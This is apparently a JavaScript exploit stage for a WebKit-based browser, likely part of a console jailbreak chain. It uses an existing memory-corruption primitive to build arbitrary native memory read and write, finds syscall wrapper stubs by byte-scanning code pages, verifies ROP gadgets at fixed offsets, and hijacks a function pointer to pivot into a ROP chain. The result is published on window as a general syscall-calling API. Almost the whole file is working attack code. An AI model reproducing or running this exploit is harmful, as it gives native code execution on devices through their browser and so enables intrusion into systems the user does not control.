// v28 = v27 plus 432 (thr_self) and 481 (thr_kill2) in the optional
// byte-checked wrapper census for a signal-zero boundary discriminator.
// v27 = v26 + wanted list extended down to 532-537 (regmgr_call,
// jitshm_create/alias, dl_get_list/info/notify — never in any
// prior installer). All v26 checks unchanged.
// as exact [lo, hi] u32 pairs (kernel-range pointers), published as
// call64. Needed because kernel addresses exceed 2^53 and lose low
// bits through JS Number arithmetic, and the standard caller rejects
// args >= 2^44. All v25 wrappers and checks unchanged.
// full cumulative wanted list now extending into 623-668 (the
// post-ipmimgr block). New numbers
// locate across all three pages and are non-fatal when absent; all
// earlier wrappers remain required. Four benign getpid calls validate
// the variable-length native chain.
var state = window.__fw14ArrayState;
var plan = window.__fw14NativePlan;
var result;
var phase = "preflight";
try {
  if (!state || !plan || !state.view || !state.array || !state.a ||
      !state.ownedTypedView || !state.calibratedViewBase ||
      state.array[0] !== state.a || !plan.store || !plan.pivot ||
      !plan.stack || !plan.frame || !plan.addresses ||
      !plan.functionSlot || !plan.pivotCell || !plan.pivotObject)
    throw new Error("held_plan_missing");
  var forged = state.view;
  var carrier = state.ownedTypedView;
  var base = state.calibratedViewBase;
  if (carrier.length !== 65536 || carrier[0] !== 0x31 ||
      carrier[7] !== 0xa8 || base % 4096 !== 0)
    throw new Error("carrier_canary_changed");
  function bytesAt(index, count) {
    var out = [];
    for (var n = 0; n < count; n++) out.push(forged[index + n]);
    return out;
  }
  function valueOf(bytes) {
    var value = 0;
    for (var n = bytes.length - 1; n >= 0; n--)
      value = value * 256 + bytes[n];
    return value;
  }
  function pointerBytes(value) {
    if (!Number.isSafeInteger(value) || value < 0 ||
        value >= 0x1000000000000)
      throw new Error("pointer_invalid");
    var out = [];
    for (var n = 0; n < 8; n++)
      out.push(Math.floor(value / Math.pow(2, n * 8)) & 255);
    return out;
  }
  function same(left, right) {
    if (!left || !right || left.length !== right.length) return false;
    for (var n = 0; n < left.length; n++)
      if (left[n] !== right[n]) return false;
    return true;
  }
  function addressOf(object) {
    try {
      state.array[0] = object;
      return valueOf(bytesAt(state.index, 8));
    } finally {
      state.array[0] = state.a;
    }
  }
  var carrierIndex = addressOf(carrier) - base;
  var carrierSlot = carrierIndex + 8;
  if (!Number.isSafeInteger(carrierSlot) || carrierSlot < 0 ||
      carrierSlot + 8 >= 16777216)
    throw new Error("carrier_slot_invalid");
  var carrierOriginal = bytesAt(carrierSlot, 8);
  function readAt(address, count) {
    if (!Number.isSafeInteger(address) || address < 0x100000000 ||
        address >= 0x1000000000000 || count < 1 || count > 192)
      throw new Error("native_read_invalid");
    var next = pointerBytes(address);
    try {
      for (var n = 0; n < 8; n++) forged[carrierSlot + n] = next[n];
      var out = [];
      for (var r = 0; r < count; r++) out.push(carrier[r]);
      return out;
    } finally {
      for (var x = 0; x < 8; x++)
        forged[carrierSlot + x] = carrierOriginal[x];
    }
  }
  function writeAt(address, bytes) {
    if (!Number.isSafeInteger(address) || address < 0x100000000 ||
        address >= 0x1000000000000 || address % 8 !== 0 ||
        !bytes || bytes.length !== 8)
      throw new Error("native_write_invalid");
    var next = pointerBytes(address);
    try {
      for (var n = 0; n < 8; n++) forged[carrierSlot + n] = next[n];
      for (var w = 0; w < 8; w++) carrier[w] = bytes[w];
    } finally {
      for (var x = 0; x < 8; x++)
        forged[carrierSlot + x] = carrierOriginal[x];
    }
  }
  var wrappers = {
    getpid: [plan.target, 0x14],
    kqueue: [plan.target + 0x580, 0x16a],
    kevent: [plan.target - 0x850, 0x16b],
    close: [plan.target + 0xab0, 0x06]
  };
  function wrapperBytes(number) {
    return [0x48,0xc7,0xc0,number & 255,(number >>> 8) & 255,
            0,0,0x49,0x89,0xca,0x0f,0x05,0x72,0x01,0xc3,0x48];
  }
  var anchor = plan.target - 0xb60;
  if (anchor % 4096 !== 0)
    throw new Error("wrapper_anchor_unaligned");
  function readPage(address) {
    var out=[];
    for (var offset=0;offset<4096;offset+=128)
      out.push.apply(out,readAt(address+offset,128));
    return out;
  }
  function locate(page,address,number) {
    var expected=wrapperBytes(number);
    var found=[];
    for (var offset=0;offset<=4096-16;offset++)
      if (same(page.slice(offset,offset+16),expected))
        found.push(address+offset);
    if (found.length!==1)
      throw new Error("wrapper_location_invalid_"+number);
    return found[0];
  }
  var beforePage=readPage(anchor-4096);
  var anchorPage=readPage(anchor);
  var afterPage=readPage(anchor+4096);
  var extraPages = [];
  var extraOffsets = [-12288, -8192, 8192, 12288];
  for (var ep = 0; ep < extraOffsets.length; ep++) {
    var epBase = anchor + extraOffsets[ep];
    if (epBase % 4096 !== 0)
      throw new Error("extra_page_unaligned_" + extraOffsets[ep]);
    extraPages.push({ base: epBase, data: readPage(epBase) });
  }
  function locateIn(page, baseAddr, number) {
    var expected = wrapperBytes(number);
    for (var offset = 0; offset <= 4096 - 16; offset++)
      if (same(page.slice(offset, offset + 16), expected))
        return baseAddr + offset;
    return null;
  }
  function locateAny(number) {
    var hit = locateIn(beforePage, anchor - 4096, number);
    if (hit !== null) return hit;
    hit = locateIn(anchorPage, anchor, number);
    if (hit !== null) return hit;
    hit = locateIn(afterPage, anchor + 4096, number);
    if (hit !== null) return hit;
    for (var lp = 0; lp < extraPages.length; lp++) {
      hit = locateIn(extraPages[lp].data, extraPages[lp].base, number);
      if (hit !== null) return hit;
    }
    return null;
  }
  var wanted = [432, 481, 532, 533, 534, 535, 536, 537,
    545, 546, 547, 548, 549, 550, 551, 552, 553, 554,
    555, 556, 558, 559, 560, 597,
    561, 562, 563, 564, 565, 566, 567, 568, 569, 570,
    571, 572, 573, 574, 575, 576, 577, 578, 579, 580,
    581, 582, 583, 584, 585, 586, 587, 588, 589, 590,
    609, 610, 611, 612, 613, 614, 615, 616, 617, 618, 619, 620, 621,
    623, 624, 625, 626, 627, 628, 629, 630, 631, 632, 633, 634, 635,
    636, 637, 639, 640, 641, 642, 643, 644, 645, 646, 647, 648, 649,
    650, 651, 652, 653, 654, 655, 656, 657, 658, 659, 660, 661, 662,
    663, 664, 665, 666, 667, 668];
  var foundNums = [], missingNums = [];
  for (var wq = 0; wq < wanted.length; wq++) {
    var loc = locateAny(wanted[wq]);
    if (loc === null) { missingNums.push(wanted[wq]); continue; }
    wrappers["sys" + wanted[wq]] = [loc, wanted[wq]];
    foundNums.push(wanted[wq]);
  }
  wrappers.write=[locate(beforePage,anchor-4096,4),4];
  wrappers.open=[locate(beforePage,anchor-4096,5),5];
  wrappers.read=[locate(anchorPage,anchor,3),3];
  wrappers.dynlib_dlsym=[locate(beforePage,anchor-4096,591),591];
  wrappers.dynlib_list=[locate(afterPage,anchor+4096,592),592];
  wrappers.dynlib_info=[locate(beforePage,anchor-4096,593),593];
  wrappers.dynlib_info_ex=[locate(beforePage,anchor-4096,608),608];
  wrappers.sys540=[locate(anchorPage,anchor,540),540];
  wrappers.sys638=[locate(anchorPage,anchor,638),638];
  wrappers.sys557=[locate(afterPage,anchor+4096,557),557];
  wrappers.sys593=[locate(beforePage,anchor-4096,593),593];
  wrappers.sys594=[locate(beforePage,anchor-4096,594),594];
  wrappers.sys595=[locate(beforePage,anchor-4096,595),595];
  wrappers.sys596=[locate(beforePage,anchor-4096,596),596];
  wrappers.sys598=[locate(afterPage,anchor+4096,598),598];
  wrappers.sys599=[locate(beforePage,anchor-4096,599),599];
  wrappers.sys600=[locate(beforePage,anchor-4096,600),600];
  wrappers.sys601=[locate(anchorPage,anchor,601),601];
  wrappers.sys602=[locate(beforePage,anchor-4096,602),602];
  wrappers.sys603=[locate(anchorPage,anchor,603),603];
  wrappers.sys604=[locate(beforePage,anchor-4096,604),604];
  wrappers.sys605=[locate(anchorPage,anchor,605),605];
  wrappers.sys606=[locate(anchorPage,anchor,606),606];
  wrappers.sys607=[locate(anchorPage,anchor,607),607];
  wrappers.dup=[locate(beforePage,anchor-4096,41),41];
  wrappers.socketpair=[locate(anchorPage,anchor,135),135];
  wrappers.getppid=[locate(beforePage,anchor-4096,39),39];
  wrappers.kill=[locate(afterPage,anchor+4096,37),37];
  wrappers.sigqueue=[locate(anchorPage,anchor,456),456];
  wrappers.umtx=[locate(beforePage,anchor-4096,454),454];
  wrappers.sysctl=[plan.target-0xc20,202];
  wrappers.errno=[plan.target-0x6cf0,null];
  var errnoBytes=[0x55,0x48,0x89,0xe5,0x48,0x8b,0x05,0x05,
                  0x25,0x03,0x00,0x48,0x85,0xc0,0x74,0x05];
  function signature(name) {
    return name==="errno"?errnoBytes:wrapperBytes(wrappers[name][1]);
  }
  var gadget = plan.webkitBase + 0x295f948;
  var codeChecks = [
    [gadget,[0x48,0x8b,0x7e,0x30,0x48,0x8b,0x07,0xff,0x10]],
    [plan.webkitBase + 0x5c480,[0x5f,0xc3]],
    [plan.webkitBase + 0x6e45e,[0x5e,0xc3]],
    [plan.webkitBase + 0x12c5ba,[0x5a,0xc3]],
    [plan.webkitBase + 0x1bade,[0x59,0xc3]],
    [plan.webkitBase + 0x9b311,[0x47,0x58,0xc3]],
    [plan.webkitBase + 0x1dcfb1,[0x47,0x59,0xc3]],
    [plan.webkitBase + 0x548b,[0x48,0x89,0x07,0xc3]],
    [plan.webkitBase + 0x10504,[0x58,0xc3]],
    [plan.webkitBase + 0x182f7,[0xc9,0xc3]]
  ];
  phase = "live_bytes";
  for (var ci = 0; ci < codeChecks.length; ci++)
    if (!same(readAt(codeChecks[ci][0],codeChecks[ci][1].length),
              codeChecks[ci][1]))
      throw new Error("gadget_byte_mismatch_" + ci);
  var names = Object.keys(wrappers);
  for (var wi = 0; wi < names.length; wi++) {
    var entry = wrappers[names[wi]];
    if (!same(readAt(entry[0],16),signature(names[wi])))
      throw new Error("wrapper_byte_mismatch_" + names[wi]);
  }
  if (!same(readAt(plan.functionSlot,8),plan.originalFunctionSlot) ||
      !same(readAt(plan.addresses.stack + plan.stackOffset,8),
            pointerBytes(plan.target)) ||
      !same(readAt(plan.addresses.store,8),
            Array.from(plan.store.subarray(0,8))) ||
      Math.abs(Math.expm1(1)-1.718281828459045)>1e-12)
    throw new Error("native_plan_changed");
  var scratchOffset = 0x2f80;
  var chainSize = 19 * 8;
  if (scratchOffset < plan.stackOffset + 64 ||
      scratchOffset + chainSize >= plan.stack.length ||
      plan.frame.length < 0x2000)
    throw new Error("scratch_region_invalid");
  var caller = function (name, args) {
    if (!Object.prototype.hasOwnProperty.call(wrappers,name))
      throw new Error("wrapper_not_allowed");
    if (!Array.isArray(args) || args.length > 6)
      throw new Error("args_invalid");
    var values = [];
    for (var ai = 0; ai < 6; ai++) {
      var value = ai < args.length ? args[ai] : 0;
      if (!Number.isSafeInteger(value) || value < 0 ||
          value >= 0x1000000000000)
        throw new Error("arg_invalid_" + ai);
      values.push(value);
    }
    var target = wrappers[name][0];
    if (!same(readAt(target,16),signature(name)) ||
        !same(readAt(plan.functionSlot,8),plan.originalFunctionSlot) ||
        !same(readAt(plan.addresses.store,8),
              Array.from(plan.store.subarray(0,8))) ||
        !same(readAt(plan.addresses.stack + plan.stackOffset,8),
              pointerBytes(plan.target)) ||
        Math.abs(Math.expm1(1)-1.718281828459045)>1e-12)
      throw new Error("call_preflight_changed");
    var functionOriginal = readAt(plan.functionSlot,8);
    var pivotOriginal = readAt(plan.pivotCell,8);
    var pivotStackOriginal = readAt(plan.addresses.pivot+0x38,8);
    var frameOriginal = Array.from(plan.frame.subarray(0,8));
    var chainOriginal = Array.from(plan.stack.subarray(
      scratchOffset,scratchOffset+chainSize));
    if (!same(pivotOriginal.slice(0,7),plan.pivotHeader.slice(0,7)) ||
        pivotOriginal[7] > 2 ||
        !same(pivotStackOriginal,
              pointerBytes(plan.addresses.stack+plan.stackOffset)))
      throw new Error("pivot_preflight_changed");
    var functionTouched=false,pivotTouched=false,stackTouched=false;
    var chainTouched=false,frameTouched=false;
    var output=null,returnTime=0;
    try {
      frameTouched=true;
      plan.frame.fill(0xa5,0,8);
      if (!same(readAt(plan.addresses.frame,8),
                [0xa5,0xa5,0xa5,0xa5,0xa5,0xa5,0xa5,0xa5]))
        throw new Error("result_sentinel_changed");
      var chain=[plan.webkitBase+0x5c480,values[0],
        plan.webkitBase+0x6e45e,values[1],
        plan.webkitBase+0x12c5ba,values[2],
        plan.webkitBase+0x1bade,values[3],
        plan.webkitBase+0x9b311,values[4],
        plan.webkitBase+0x1dcfb1,values[5],
        target,plan.webkitBase+0x5c480,plan.addresses.frame,
        plan.webkitBase+0x548b,plan.webkitBase+0x10504,null,
        plan.webkitBase+0x182f7];
      var stackView=new DataView(plan.stack.buffer);
      chainTouched=true;
      for (var c=0;c<chain.length;c++) {
        if (c===17) {
          stackView.setUint32(scratchOffset+c*8,0x0a,true);
          stackView.setUint32(scratchOffset+c*8+4,0xfffffff7,true);
        } else {
          stackView.setUint32(scratchOffset+c*8,chain[c]>>>0,true);
          stackView.setUint32(scratchOffset+c*8+4,
            Math.floor(chain[c]/0x100000000)>>>0,true);
        }
      }
      stackTouched=true;
      var nextStack=pointerBytes(plan.addresses.stack+scratchOffset);
      for (var s=0;s<8;s++) plan.pivot[0x38+s]=nextStack[s];
      if (!same(readAt(plan.addresses.stack+scratchOffset,chainSize),
                Array.from(plan.stack.subarray(scratchOffset,
                                              scratchOffset+chainSize))) ||
          !same(readAt(plan.addresses.pivot+0x38,8),nextStack))
        throw new Error("chain_readback_failed");
      functionTouched=true;
      writeAt(plan.functionSlot,pointerBytes(gadget));
      pivotTouched=true;
      writeAt(plan.pivotCell,pointerBytes(plan.addresses.store));
      if (!same(readAt(plan.functionSlot,8),pointerBytes(gadget)) ||
          !same(readAt(plan.pivotCell,8),
                pointerBytes(plan.addresses.store)))
        throw new Error("call_arm_failed");
      Math.expm1(plan.pivotObject);
      returnTime=Date.now();
      var frameView=new DataView(plan.frame.buffer);
      output={ value:frameView.getInt32(0,true),
               high:frameView.getUint32(4,true),
               returned_at:returnTime };
    } finally {
      if (functionTouched) writeAt(plan.functionSlot,functionOriginal);
      if (pivotTouched) writeAt(plan.pivotCell,pivotOriginal);
      if (stackTouched)
        for (var ps=0;ps<8;ps++)
          plan.pivot[0x38+ps]=pivotStackOriginal[ps];
      if (chainTouched)
        for (var cs=0;cs<chainSize;cs++)
          plan.stack[scratchOffset+cs]=chainOriginal[cs];
      if (frameTouched)
        for (var fs=0;fs<8;fs++) plan.frame[fs]=frameOriginal[fs];
    }
    if (!same(readAt(plan.functionSlot,8),functionOriginal) ||
        !same(readAt(plan.pivotCell,8),pivotOriginal) ||
        !same(readAt(plan.addresses.pivot+0x38,8),pivotStackOriginal) ||
        !same(readAt(plan.addresses.stack+scratchOffset,chainSize),
              chainOriginal) ||
        !same(readAt(plan.addresses.frame,8),frameOriginal) ||
        !same(bytesAt(carrierSlot,8),carrierOriginal) ||
        carrier[0]!==0x31 || carrier[7]!==0xa8 ||
        state.array[0]!==state.a)
      throw new Error("call_restore_failed");
    return output;
  };
  var caller64 = function (name, argPairs) {
    if (!Object.prototype.hasOwnProperty.call(wrappers,name))
      throw new Error("wrapper_not_allowed");
    if (!Array.isArray(argPairs) || argPairs.length > 6)
      throw new Error("args_invalid");
    var values = [];
    for (var ai = 0; ai < 6; ai++) {
      var pair = ai < argPairs.length ? argPairs[ai] : [0, 0];
      if (!Array.isArray(pair) || pair.length !== 2 ||
          !Number.isSafeInteger(pair[0]) || pair[0] < 0 ||
          pair[0] > 0xffffffff ||
          !Number.isSafeInteger(pair[1]) || pair[1] < 0 ||
          pair[1] > 0xffffffff)
        throw new Error("arg64_invalid_" + ai);
      values.push({lo:pair[0], hi:pair[1]});
    }
    var target = wrappers[name][0];
    if (!same(readAt(target,16),signature(name)) ||
        !same(readAt(plan.functionSlot,8),plan.originalFunctionSlot) ||
        !same(readAt(plan.addresses.store,8),
              Array.from(plan.store.subarray(0,8))) ||
        !same(readAt(plan.addresses.stack + plan.stackOffset,8),
              pointerBytes(plan.target)) ||
        Math.abs(Math.expm1(1)-1.718281828459045)>1e-12)
      throw new Error("call64_preflight_changed");
    var functionOriginal = readAt(plan.functionSlot,8);
    var pivotOriginal = readAt(plan.pivotCell,8);
    var pivotStackOriginal = readAt(plan.addresses.pivot+0x38,8);
    var frameOriginal = Array.from(plan.frame.subarray(0,8));
    var chainOriginal = Array.from(plan.stack.subarray(
      scratchOffset,scratchOffset+chainSize));
    if (!same(pivotOriginal.slice(0,7),plan.pivotHeader.slice(0,7)) ||
        pivotOriginal[7] > 2 ||
        !same(pivotStackOriginal,
              pointerBytes(plan.addresses.stack+plan.stackOffset)))
      throw new Error("call64_pivot_preflight_changed");
    var functionTouched=false,pivotTouched=false,stackTouched=false;
    var chainTouched=false,frameTouched=false;
    var output=null;
    try {
      frameTouched=true;
      plan.frame.fill(0xa5,0,8);
      if (!same(readAt(plan.addresses.frame,8),
                [0xa5,0xa5,0xa5,0xa5,0xa5,0xa5,0xa5,0xa5]))
        throw new Error("result_sentinel_changed");
      var words = [];
      function pushNum(n) {
        words.push({lo: n >>> 0,
          hi: Math.floor(n / 0x100000000) >>> 0});
      }
      pushNum(plan.webkitBase+0x5c480); pushPair(values[0]);
      pushNum(plan.webkitBase+0x6e45e); pushPair(values[1]);
      pushNum(plan.webkitBase+0x12c5ba); pushPair(values[2]);
      pushNum(plan.webkitBase+0x1bade); pushPair(values[3]);
      pushNum(plan.webkitBase+0x9b311); pushPair(values[4]);
      pushNum(plan.webkitBase+0x1dcfb1); pushPair(values[5]);
      pushNum(target);
      pushNum(plan.webkitBase+0x5c480);
      pushNum(plan.addresses.frame);
      pushNum(plan.webkitBase+0x548b);
      pushNum(plan.webkitBase+0x10504);
      words.push({lo:0x0a, hi:0xfffffff7});
      pushNum(plan.webkitBase+0x182f7);
      if (words.length !== 19)
        throw new Error("chain64_len_invalid_" + words.length);
      function pushPair(v) {
        words.push({lo: v.lo, hi: v.hi});
      }
      var stackView=new DataView(plan.stack.buffer);
      chainTouched=true;
      for (var c=0;c<19;c++) {
        stackView.setUint32(scratchOffset+c*8,words[c].lo,true);
        stackView.setUint32(scratchOffset+c*8+4,words[c].hi,true);
      }
      stackTouched=true;
      var nextStack=pointerBytes(plan.addresses.stack+scratchOffset);
      for (var s=0;s<8;s++) plan.pivot[0x38+s]=nextStack[s];
      if (!same(readAt(plan.addresses.stack+scratchOffset,chainSize),
                Array.from(plan.stack.subarray(scratchOffset,
                                              scratchOffset+chainSize))) ||
          !same(readAt(plan.addresses.pivot+0x38,8),nextStack))
        throw new Error("chain64_readback_failed");
      functionTouched=true;
      writeAt(plan.functionSlot,pointerBytes(gadget));
      pivotTouched=true;
      writeAt(plan.pivotCell,pointerBytes(plan.addresses.store));
      if (!same(readAt(plan.functionSlot,8),pointerBytes(gadget)) ||
          !same(readAt(plan.pivotCell,8),
                pointerBytes(plan.addresses.store)))
        throw new Error("call64_arm_failed");
      Math.expm1(plan.pivotObject);
      var returnTime=Date.now();
      var frameView=new DataView(plan.frame.buffer);
      output={ value:frameView.getInt32(0,true),
               high:frameView.getUint32(4,true),
               returned_at:returnTime };
    } finally {
      if (functionTouched) writeAt(plan.functionSlot,functionOriginal);
      if (pivotTouched) writeAt(plan.pivotCell,pivotOriginal);
      if (stackTouched)
        for (var ps=0;ps<8;ps++)
          plan.pivot[0x38+ps]=pivotStackOriginal[ps];
      if (chainTouched)
        for (var cs=0;cs<chainSize;cs++)
          plan.stack[scratchOffset+cs]=chainOriginal[cs];
      if (frameTouched)
        for (var fs=0;fs<8;fs++) plan.frame[fs]=frameOriginal[fs];
    }
    if (!same(readAt(plan.functionSlot,8),functionOriginal) ||
        !same(readAt(plan.pivotCell,8),pivotOriginal) ||
        !same(readAt(plan.addresses.pivot+0x38,8),pivotStackOriginal) ||
        !same(readAt(plan.addresses.stack+scratchOffset,chainSize),
              chainOriginal) ||
        !same(readAt(plan.addresses.frame,8),frameOriginal) ||
        !same(bytesAt(carrierSlot,8),carrierOriginal) ||
        carrier[0]!==0x31 || carrier[7]!==0xa8 ||
        state.array[0]!==state.a)
      throw new Error("call64_restore_failed");
    return output;
  };
  var callerMany = function (calls) {
    if (!Array.isArray(calls) || calls.length<3 || calls.length>6)
      throw new Error("multi_call_count_invalid");
    var prepared=[];
    for (var callIndex=0;callIndex<calls.length;callIndex++) {
      var item=calls[callIndex];
      if (!item || !Object.prototype.hasOwnProperty.call(wrappers,item.name) ||
          !Array.isArray(item.args) || item.args.length>6)
        throw new Error("multi_call_args_invalid_"+callIndex);
      var args=[];
      for (var argIndex=0;argIndex<6;argIndex++) {
        var number=argIndex<item.args.length ? item.args[argIndex] : 0;
        if (!Number.isSafeInteger(number) || number<0 ||
            number>=0x1000000000000)
          throw new Error("multi_call_value_invalid_"+callIndex);
        args.push(number);
      }
      var entry=wrappers[item.name];
      if (!same(readAt(entry[0],16),signature(item.name)))
        throw new Error("multi_call_wrapper_changed_"+item.name);
      prepared.push({target:entry[0],args:args});
    }
    if (!same(readAt(plan.functionSlot,8),plan.originalFunctionSlot) ||
        !same(readAt(plan.addresses.store,8),
              Array.from(plan.store.subarray(0,8))) ||
        !same(readAt(plan.addresses.stack+plan.stackOffset,8),
              pointerBytes(plan.target)) ||
        Math.abs(Math.expm1(1)-1.718281828459045)>1e-12)
      throw new Error("multi_call_plan_changed");
    var start=0x2f80,size=(calls.length*16+3)*8;
    var frameSize=calls.length*8;
    if (start<plan.stackOffset+64 || start+size>=plan.stack.length ||
        plan.frame.length<frameSize)
      throw new Error("multi_call_region_invalid");
    var originalFunction=readAt(plan.functionSlot,8);
    var originalPivot=readAt(plan.pivotCell,8);
    var originalStackPointer=readAt(plan.addresses.pivot+0x38,8);
    var originalFrame=Array.from(plan.frame.subarray(0,frameSize));
    var originalChain=Array.from(plan.stack.subarray(start,start+size));
    if (!same(originalPivot.slice(0,7),plan.pivotHeader.slice(0,7)) ||
        originalPivot[7]>2 ||
        !same(originalStackPointer,
              pointerBytes(plan.addresses.stack+plan.stackOffset)))
      throw new Error("multi_call_pivot_changed");
    var changedFunction=false,changedPivot=false,changedStack=false;
    var changedChain=false,changedFrame=false;
    var output=null;
    function chainMatches(expected) {
      for (var offset=0;offset<size;offset+=160) {
        var count=Math.min(160,size-offset);
        if (!same(readAt(plan.addresses.stack+start+offset,count),
                  expected.slice(offset,offset+count))) return false;
      }
      return true;
    }
    try {
      changedFrame=true;
      plan.frame.fill(0xa5,0,frameSize);
      if (!same(readAt(plan.addresses.frame,frameSize),
                Array(frameSize).fill(0xa5)))
        throw new Error("multi_call_frame_sentinel_changed");
      var chain=[];
      for (var index=0;index<calls.length;index++) {
        var args=prepared[index].args;
        chain.push(plan.webkitBase+0x5c480,args[0],
          plan.webkitBase+0x6e45e,args[1],
          plan.webkitBase+0x12c5ba,args[2],
          plan.webkitBase+0x1bade,args[3],
          plan.webkitBase+0x9b311,args[4],
          plan.webkitBase+0x1dcfb1,args[5],
          prepared[index].target,plan.webkitBase+0x5c480,
          plan.addresses.frame+index*8,plan.webkitBase+0x548b);
      }
      chain.push(plan.webkitBase+0x10504,null,plan.webkitBase+0x182f7);
      var sentinelIndex=chain.length-2;
      if (chain.length!==size/8 || chain[sentinelIndex]!==null)
        throw new Error("multi_call_chain_shape_invalid");
      var stackView=new DataView(plan.stack.buffer);
      changedChain=true;
      for (var word=0;word<chain.length;word++) {
        if (word===sentinelIndex) {
          stackView.setUint32(start+word*8,0x0a,true);
          stackView.setUint32(start+word*8+4,0xfffffff7,true);
        } else {
          stackView.setUint32(start+word*8,chain[word]>>>0,true);
          stackView.setUint32(start+word*8+4,
            Math.floor(chain[word]/0x100000000)>>>0,true);
        }
      }
      changedStack=true;
      var stackBytes=pointerBytes(plan.addresses.stack+start);
      for (var si=0;si<8;si++) plan.pivot[0x38+si]=stackBytes[si];
      if (!chainMatches(Array.from(plan.stack.subarray(start,start+size))) ||
          !same(readAt(plan.addresses.pivot+0x38,8),stackBytes))
        throw new Error("multi_call_chain_readback_failed");
      changedFunction=true;
      writeAt(plan.functionSlot,pointerBytes(gadget));
      changedPivot=true;
      writeAt(plan.pivotCell,pointerBytes(plan.addresses.store));
      if (!same(readAt(plan.functionSlot,8),pointerBytes(gadget)) ||
          !same(readAt(plan.pivotCell,8),
                pointerBytes(plan.addresses.store)))
        throw new Error("multi_call_arm_failed");
      Math.expm1(plan.pivotObject);
      var returnedAt=Date.now();
      var frameView=new DataView(plan.frame.buffer);
      output={values:[],returned_at:returnedAt};
      for (var ri=0;ri<calls.length;ri++)
        output.values.push({value:frameView.getInt32(ri*8,true),
                            high:frameView.getUint32(ri*8+4,true)});
    } finally {
      if (changedFunction) writeAt(plan.functionSlot,originalFunction);
      if (changedPivot) writeAt(plan.pivotCell,originalPivot);
      if (changedStack)
        for (var ps=0;ps<8;ps++)
          plan.pivot[0x38+ps]=originalStackPointer[ps];
      if (changedChain)
        for (var cs=0;cs<size;cs++)
          plan.stack[start+cs]=originalChain[cs];
      if (changedFrame)
        for (var fs=0;fs<frameSize;fs++) plan.frame[fs]=originalFrame[fs];
    }
    if (!same(readAt(plan.functionSlot,8),originalFunction) ||
        !same(readAt(plan.pivotCell,8),originalPivot) ||
        !same(readAt(plan.addresses.pivot+0x38,8),
              originalStackPointer) ||
        !chainMatches(originalChain) ||
        !same(readAt(plan.addresses.frame,frameSize),originalFrame) ||
        !same(bytesAt(carrierSlot,8),carrierOriginal) ||
        carrier[0]!==0x31 || carrier[7]!==0xa8 ||
        state.array[0]!==state.a)
      throw new Error("multi_call_restore_failed");
    return output;
  };
  var readErrno = function () {
    var result=caller("errno",[]);
    var pointer=(result.value>>>0)+result.high*0x100000000;
    if (!Number.isSafeInteger(pointer) || pointer<0x200000000 ||
        pointer>=0x900000000)
      throw new Error("errno_pointer_invalid");
    return valueOf(readAt(pointer,4));
  };
  phase="control_call";
  if (api && typeof api.markSync === "function")
    api.markSync("native_invoke_v28_preflight");
  var control=caller("getpid",[]);
  if (!control || control.value<=0 || control.value>=0x1000000 ||
      control.high!==0)
    throw new Error("control_pid_invalid");
  var quad=callerMany([{name:"getpid",args:[]},
    {name:"getpid",args:[]},{name:"getpid",args:[]},
    {name:"getpid",args:[]}]);
  if (!quad || quad.values.length!==4 ||
      quad.values.some(function (entry) {
        return entry.value!==control.value || entry.high!==0;
      }))
    throw new Error("four_call_pid_control_invalid");
  window.__fw14NativeInvoke={ call:caller,callMany:callerMany,
    call64:caller64,
    readErrno:readErrno,
    frame:plan.frame,
    frameAddress:plan.addresses.frame,
    wrappers:{ getpid:wrappers.getpid[0],
      kqueue:wrappers.kqueue[0],
      open:wrappers.open[0],read:wrappers.read[0],
      dynlib_dlsym:wrappers.dynlib_dlsym[0],
      dynlib_list:wrappers.dynlib_list[0],
      dynlib_info:wrappers.dynlib_info[0],
      dynlib_info_ex:wrappers.dynlib_info_ex[0],
      sys540:wrappers.sys540[0],sys638:wrappers.sys638[0],
      sys557:wrappers.sys557[0],
      sys593:wrappers.sys593[0],
      sys594:wrappers.sys594[0],
      sys595:wrappers.sys595[0],
      sys596:wrappers.sys596[0],
      sys598:wrappers.sys598[0],
      sys599:wrappers.sys599[0],
      sys600:wrappers.sys600[0],
      sys601:wrappers.sys601[0],
      sys602:wrappers.sys602[0],
      sys603:wrappers.sys603[0],
      sys604:wrappers.sys604[0],
      sys605:wrappers.sys605[0],
      sys606:wrappers.sys606[0],
      sys607:wrappers.sys607[0],
      kevent:wrappers.kevent[0],close:wrappers.close[0],
      write:wrappers.write[0],dup:wrappers.dup[0],
      socketpair:wrappers.socketpair[0],
      getppid:wrappers.getppid[0],kill:wrappers.kill[0],
      sigqueue:wrappers.sigqueue[0],umtx:wrappers.umtx[0],
      sysctl:wrappers.sysctl[0],
      errno:wrappers.errno[0] },
    sourceSession:"current_page" };
  for (var wp = 0; wp < foundNums.length; wp++) {
    var pubKey = "sys" + foundNums[wp];
    window.__fw14NativeInvoke.wrappers[pubKey] = wrappers[pubKey][0];
  }
  if (api && typeof api.markSync === "function")
    api.markSync("native_invoke_v28_restored");
  result={id:"native_invoke_install_v28",status:"pass",
    details:{pid:control.value,high:control.high,
      four_pid:quad.values[3].value,
      wrappers_checked:Object.keys(wrappers).length,
      sys_found:foundNums.join(","),
      sys_missing:missingNums.join(","),
      gadgets_checked:codeChecks.length,
      carrier_restored:same(bytesAt(carrierSlot,8),carrierOriginal),
      write_offset:wrappers.write[0]-anchor,
      dup_offset:wrappers.dup[0]-anchor,
      socketpair_offset:wrappers.socketpair[0]-anchor}};
} catch (error) {
  result={id:"native_invoke_install_v28",status:"error",
    details:{phase:phase,error:String(error).slice(0,180)}};
}
return [result];
